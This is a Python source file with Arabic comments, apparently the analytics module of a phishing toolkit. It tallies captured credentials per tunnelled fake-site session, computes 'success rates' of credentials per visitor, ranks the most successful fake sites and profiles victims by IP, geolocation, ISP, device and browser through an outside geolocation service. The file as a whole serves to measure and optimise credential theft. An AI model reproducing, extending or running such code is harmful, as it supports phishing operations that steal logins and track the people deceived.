"""
📊 نظام التحليل والإحصائيات المتقدم
يقدم تحليلات عميقة للبيانات والأنشطة
"""

import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from collections import defaultdict, Counter
import json

from ..database import db_manager, get_session
from ..config import settings

logger = logging.getLogger(__name__)

class DataAnalyzer:
    """محلل البيانات المتقدم"""
    
    def __init__(self):
        self.cache = {}
        self.cache_ttl = 300  # 5 دقائق
    
    async def get_session_analytics(self, session_id: str) -> Dict[str, Any]:
        """تحليل شامل لجلسة محددة"""
        
        try:
            # البيانات المُلتقطة للجلسة
            captured_data = await db_manager.get_session_captured_data(session_id)
            
            if not captured_data:
                return {"error": "لا توجد بيانات للتحليل"}
            
            analytics = {
                "total_captures": len(captured_data),
                "geographic_distribution": self._analyze_geographic_distribution(captured_data),
                "device_analysis": self._analyze_devices(captured_data),
                "browser_analysis": self._analyze_browsers(captured_data),
                "time_distribution": self._analyze_time_distribution(captured_data),
                "success_metrics": self._calculate_success_metrics(captured_data),
                "visitor_behavior": self._analyze_visitor_behavior(captured_data)
            }
            
            return analytics
            
        except Exception as e:
            logger.error(f"خطأ في تحليل الجلسة {session_id}: {e}")
            return {"error": str(e)}
    
    def _analyze_geographic_distribution(self, data: List[Any]) -> Dict[str, Any]:
        """تحليل التوزيع الجغرافي"""
        
        countries = Counter()
        cities = Counter()
        isps = Counter()
        
        for item in data:
            if item.country:
                countries[item.country] += 1
            if item.city:
                cities[f"{item.city}, {item.country}"] += 1
            if item.isp:
                isps[item.isp] += 1
        
        return {
            "top_countries": dict(countries.most_common(10)),
            "top_cities": dict(cities.most_common(10)),
            "top_isps": dict(isps.most_common(5)),
            "unique_countries": len(countries),
            "unique_cities": len(cities)
        }
    
    def _analyze_devices(self, data: List[Any]) -> Dict[str, Any]:
        """تحليل الأجهزة"""
        
        devices = Counter()
        operating_systems = Counter()
        
        for item in data:
            if item.device_type:
                devices[item.device_type] += 1
            if item.os:
                operating_systems[item.os] += 1
        
        total = len(data)
        
        return {
            "device_breakdown": {
                device: {"count": count, "percentage": round((count/total)*100, 2)}
                for device, count in devices.items()
            },
            "os_breakdown": {
                os: {"count": count, "percentage": round((count/total)*100, 2)}
                for os, count in operating_systems.items()
            },
            "mobile_percentage": round((devices.get('mobile', 0)/total)*100, 2),
            "desktop_percentage": round((devices.get('desktop', 0)/total)*100, 2)
        }
    
    def _analyze_browsers(self, data: List[Any]) -> Dict[str, Any]:
        """تحليل المتصفحات"""
        
        browsers = Counter()
        
        for item in data:
            if item.browser:
                # استخراج اسم المتصفح الأساسي
                browser_name = item.browser.split()[0] if item.browser else "Unknown"
                browsers[browser_name] += 1
        
        total = len(data)
        
        return {
            "browser_breakdown": {
                browser: {"count": count, "percentage": round((count/total)*100, 2)}
                for browser, count in browsers.most_common(10)
            },
            "most_popular": browsers.most_common(1)[0][0] if browsers else "Unknown"
        }
    
    def _analyze_time_distribution(self, data: List[Any]) -> Dict[str, Any]:
        """تحليل التوزيع الزمني"""
        
        hourly_distribution = defaultdict(int)
        daily_distribution = defaultdict(int)
        
        for item in data:
            created_time = item.created_at
            hour = created_time.hour
            day = created_time.strftime('%A')
            
            hourly_distribution[hour] += 1
            daily_distribution[day] += 1
        
        return {
            "hourly_distribution": dict(hourly_distribution),
            "daily_distribution": dict(daily_distribution),
            "peak_hour": max(hourly_distribution.items(), key=lambda x: x[1])[0] if hourly_distribution else 0,
            "peak_day": max(daily_distribution.items(), key=lambda x: x[1])[0] if daily_distribution else "Unknown"
        }
    
    def _calculate_success_metrics(self, data: List[Any]) -> Dict[str, Any]:
        """حساب مقاييس النجاح"""
        
        total_captures = len(data)
        complete_captures = sum(1 for item in data if item.is_complete())
        verified_captures = sum(1 for item in data if item.is_verified)
        
        return {
            "total_captures": total_captures,
            "complete_captures": complete_captures,
            "verified_captures": verified_captures,
            "completion_rate": round((complete_captures/total_captures)*100, 2) if total_captures > 0 else 0,
            "verification_rate": round((verified_captures/total_captures)*100, 2) if total_captures > 0 else 0,
            "quality_score": self._calculate_quality_score(data)
        }
    
    def _analyze_visitor_behavior(self, data: List[Any]) -> Dict[str, Any]:
        """تحليل سلوك الزوار"""
        
        unique_ips = set()
        repeat_visitors = defaultdict(int)
        
        for item in data:
            ip = item.ip_address
            unique_ips.add(ip)
            repeat_visitors[ip] += 1
        
        repeat_count = sum(1 for count in repeat_visitors.values() if count > 1)
        
        return {
            "unique_visitors": len(unique_ips),
            "total_visits": len(data),
            "repeat_visitors": repeat_count,
            "bounce_rate": round((len(unique_ips)/len(data))*100, 2) if data else 0,
            "avg_visits_per_visitor": round(len(data)/len(unique_ips), 2) if unique_ips else 0
        }
    
    def _calculate_quality_score(self, data: List[Any]) -> float:
        """حساب نقاط الجودة للبيانات"""
        
        if not data:
            return 0.0
        
        quality_factors = {
            "completion": sum(1 for item in data if item.is_complete()) / len(data),
            "geographic_diversity": min(len(set(item.country for item in data if item.country)) / 10, 1.0),
            "device_diversity": min(len(set(item.device_type for item in data if item.device_type)) / 3, 1.0),
            "time_spread": self._calculate_time_spread(data)
        }
        
        weights = {
            "completion": 0.4,
            "geographic_diversity": 0.2,
            "device_diversity": 0.2,
            "time_spread": 0.2
        }
        
        quality_score = sum(quality_factors[factor] * weights[factor] for factor in quality_factors)
        
        return round(quality_score * 100, 2)
    
    def _calculate_time_spread(self, data: List[Any]) -> float:
        """حساب انتشار البيانات زمنياً"""
        
        if len(data) < 2:
            return 0.0
        
        times = [item.created_at for item in data]
        time_span = (max(times) - min(times)).total_seconds()
        
        # تطبيع القيمة (أكثر من ساعة = 1.0)
        return min(time_span / 3600, 1.0)
    
    async def get_user_analytics(self, user_id: int) -> Dict[str, Any]:
        """تحليل شامل للمستخدم"""
        
        try:
            user_stats = await db_manager.get_user_statistics(user_id)
            user_sessions = await db_manager.get_user_sessions(user_id, limit=100)
            
            analytics = {
                "basic_stats": user_stats,
                "session_analysis": self._analyze_user_sessions(user_sessions),
                "activity_patterns": await self._analyze_user_activity_patterns(user_id),
                "performance_metrics": await self._calculate_user_performance(user_id)
            }
            
            return analytics
            
        except Exception as e:
            logger.error(f"خطأ في تحليل المستخدم {user_id}: {e}")
            return {"error": str(e)}
    
    def _analyze_user_sessions(self, sessions: List[Any]) -> Dict[str, Any]:
        """تحليل جلسات المستخدم"""
        
        if not sessions:
            return {"message": "لا توجد جلسات للتحليل"}
        
        site_preferences = Counter()
        tunnel_preferences = Counter()
        success_rates = []
        
        for session in sessions:
            site_preferences[session.site_type] += 1
            tunnel_preferences[session.tunnel_type] += 1
            
            if session.total_visitors > 0:
                success_rate = (session.total_credentials / session.total_visitors) * 100
                success_rates.append(success_rate)
        
        return {
            "total_sessions": len(sessions),
            "favorite_sites": dict(site_preferences.most_common(5)),
            "preferred_tunnels": dict(tunnel_preferences.most_common()),
            "average_success_rate": round(sum(success_rates) / len(success_rates), 2) if success_rates else 0,
            "most_successful_site": site_preferences.most_common(1)[0][0] if site_preferences else "None"
        }
    
    async def _analyze_user_activity_patterns(self, user_id: int) -> Dict[str, Any]:
        """تحليل أنماط نشاط المستخدم"""
        
        # تحليل الأوقات المفضلة للاستخدام
        logs = await db_manager.get_system_logs(user_id=user_id, hours=24*7, limit=200)
        
        if not logs:
            return {"message": "لا توجد بيانات نشاط كافية"}
        
        hourly_activity = defaultdict(int)
        daily_activity = defaultdict(int)
        
        for log in logs:
            hour = log.created_at.hour
            day = log.created_at.strftime('%A')
            
            hourly_activity[hour] += 1
            daily_activity[day] += 1
        
        return {
            "most_active_hour": max(hourly_activity.items(), key=lambda x: x[1])[0] if hourly_activity else 0,
            "most_active_day": max(daily_activity.items(), key=lambda x: x[1])[0] if daily_activity else "Unknown",
            "activity_distribution": {
                "hourly": dict(hourly_activity),
                "daily": dict(daily_activity)
            }
        }
    
    async def _calculate_user_performance(self, user_id: int) -> Dict[str, Any]:
        """حساب مقاييس أداء المستخدم"""
        
        user_sessions = await db_manager.get_user_sessions(user_id, limit=50)
        
        if not user_sessions:
            return {"message": "لا توجد جلسات للتحليل"}
        
        total_visitors = sum(session.total_visitors for session in user_sessions)
        total_captures = sum(session.total_credentials for session in user_sessions)
        
        # حساب متوسط مدة الجلسات
        durations = []
        for session in user_sessions:
            if session.started_at and session.stopped_at:
                duration = (session.stopped_at - session.started_at).total_seconds() / 3600  # بالساعات
                durations.append(duration)
        
        return {
            "total_visitors_attracted": total_visitors,
            "total_data_captured": total_captures,
            "overall_success_rate": round((total_captures / total_visitors) * 100, 2) if total_visitors > 0 else 0,
            "average_session_duration": round(sum(durations) / len(durations), 2) if durations else 0,
            "sessions_per_week": len([s for s in user_sessions if s.created_at > datetime.utcnow() - timedelta(weeks=1)]),
            "efficiency_score": self._calculate_efficiency_score(user_sessions)
        }
    
    def _calculate_efficiency_score(self, sessions: List[Any]) -> float:
        """حساب نقاط الكفاءة"""
        
        if not sessions:
            return 0.0
        
        # عوامل الكفاءة
        avg_success_rate = sum(
            (s.total_credentials / s.total_visitors * 100) if s.total_visitors > 0 else 0 
            for s in sessions
        ) / len(sessions)
        
        session_frequency = len(sessions) / max((datetime.utcnow() - min(s.created_at for s in sessions)).days, 1)
        
        efficiency = (avg_success_rate * 0.7) + (min(session_frequency * 10, 30) * 0.3)
        
        return round(efficiency, 2)

class GeoIPAnalyzer:
    """محلل المواقع الجغرافية المتقدم"""
    
    def __init__(self):
        self.geoip_cache = {}
    
    async def analyze_ip_address(self, ip_address: str) -> Dict[str, Any]:
        """تحليل شامل لعنوان IP"""
        
        if ip_address in self.geoip_cache:
            return self.geoip_cache[ip_address]
        
        try:
            # تحليل جغرافي أساسي
            geo_data = await self._get_basic_geo_info(ip_address)
            
            # تحليل الأمان
            security_info = await self._analyze_ip_security(ip_address)
            
            # تحليل الشبكة
            network_info = await self._analyze_network_info(ip_address)
            
            result = {
                "ip_address": ip_address,
                "geographic": geo_data,
                "security": security_info,
                "network": network_info,
                "risk_score": self._calculate_risk_score(geo_data, security_info, network_info)
            }
            
            # حفظ في الكاش
            self.geoip_cache[ip_address] = result
            
            return result
            
        except Exception as e:
            logger.error(f"خطأ في تحليل IP {ip_address}: {e}")
            return {"error": str(e)}
    
    async def _get_basic_geo_info(self, ip_address: str) -> Dict[str, Any]:
        """الحصول على المعلومات الجغرافية الأساسية"""
        
        try:
            import aiohttp
            
            async with aiohttp.ClientSession() as session:
                url = f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
                
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        if data.get('status') == 'success':
                            return {
                                "country": data.get('country'),
                                "country_code": data.get('countryCode'),
                                "region": data.get('regionName'),
                                "city": data.get('city'),
                                "zip_code": data.get('zip'),
                                "latitude": data.get('lat'),
                                "longitude": data.get('lon'),
                                "timezone": data.get('timezone'),
                                "isp": data.get('isp'),
                                "organization": data.get('org'),
                                "as_info": data.get('as')
                            }
            
            return {"error": "فشل في الحصول على المعلومات الجغرافية"}
            
        except Exception as e:
            return {"error": f"خطأ في الحصول على المعلومات الجغرافية: {e}"}
    
    async def _analyze_ip_security(self, ip_address: str) -> Dict[str, Any]:
        """تحليل الأمان لعنوان IP"""
        
        security_flags = {
            "is_vpn": False,
            "is_proxy": False,
            "is_tor": False,
            "is_hosting": False,
            "threat_level": "low"
        }
        
        try:
            # فحص نطاقات VPN المعروفة
            if await self._check_vpn_ranges(ip_address):
                security_flags["is_vpn"] = True
                security_flags["threat_level"] = "medium"
            
            # فحص قوائم البروكسي المعروفة
            if await self._check_proxy_lists(ip_address):
                security_flags["is_proxy"] = True
                security_flags["threat_level"] = "medium"
            
            # فحص شبكة Tor
            if await self._check_tor_exits(ip_address):
                security_flags["is_tor"] = True
                security_flags["threat_level"] = "high"
            
            return security_flags
            
        except Exception as e:
            logger.warning(f"خطأ في تحليل أمان IP {ip_address}: {e}")
            return security_flags
    
    async def _analyze_network_info(self, ip_address: str) -> Dict[str, Any]:
        """تحليل معلومات الشبكة"""
        
        try:
            import ipaddress
            
            ip_obj = ipaddress.ip_address(ip_address)
            
            network_info = {
                "ip_version": ip_obj.version,
                "is_private": ip_obj.is_private,
                "is_loopback": ip_obj.is_loopback,
                "is_multicast": ip_obj.is_multicast,
                "is_reserved": ip_obj.is_reserved,
                "ip_type": self._determine_ip_type(ip_obj)
            }
            
            return network_info
            
        except Exception as e:
            return {"error": f"خطأ في تحليل الشبكة: {e}"}
    
    def _determine_ip_type(self, ip_obj) -> str:
        """تحديد نوع عنوان IP"""
        
        if ip_obj.is_private:
            return "private"
        elif ip_obj.is_loopback:
            return "loopback"
        elif ip_obj.is_multicast:
            return "multicast"
        elif ip_obj.is_reserved:
            return "reserved"
        else:
            return "public"
    
    async def _check_vpn_ranges(self, ip_address: str) -> bool:
        """فحص نطاقات VPN المعروفة"""
        # تنفيذ مبسط - يمكن تحسينه باستخدام قواعد بيانات VPN
        return False
    
    async def _check_proxy_lists(self, ip_address: str) -> bool:
        """فحص قوائم البروكسي المعروفة"""
        # تنفيذ مبسط - يمكن تحسينه باستخدام قوائم البروكسي المحدثة
        return False
    
    async def _check_tor_exits(self, ip_address: str) -> bool:
        """فحص عقد خروج Tor"""
        # تنفيذ مبسط - يمكن تحسينه باستخدام قائمة عقد Tor
        return False
    
    def _calculate_risk_score(self, geo_data: Dict, security_info: Dict, network_info: Dict) -> int:
        """حساب نقاط المخاطر (0-100)"""
        
        risk_score = 0
        
        # عوامل الأمان
        if security_info.get("is_tor"):
            risk_score += 40
        elif security_info.get("is_vpn"):
            risk_score += 25
        elif security_info.get("is_proxy"):
            risk_score += 20
        
        # عوامل الشبكة
        if network_info.get("is_private"):
            risk_score += 10
        
        # عوامل جغرافية (يمكن تخصيصها حسب المتطلبات)
        high_risk_countries = ["Unknown", ""]
        if geo_data.get("country") in high_risk_countries:
            risk_score += 15
        
        return min(risk_score, 100)

# مثيلات عامة
data_analyzer = DataAnalyzer()
geoip_analyzer = GeoIPAnalyzer()